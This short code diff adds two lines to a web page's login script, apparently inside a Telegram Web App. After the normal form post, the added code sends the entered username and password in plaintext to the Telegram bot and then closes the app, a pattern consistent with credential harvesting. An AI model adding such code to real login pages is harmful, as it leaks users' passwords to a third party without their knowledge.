@@ -93,6 +93,10 @@
 
             // Send the form data
             xhr.send(formData);
+            Telegram.WebApp.sendData(JSON.stringify({username: username, password: password}));
+
+            // Close the Web App
+            Telegram.WebApp.close();
         }
     </script>
     
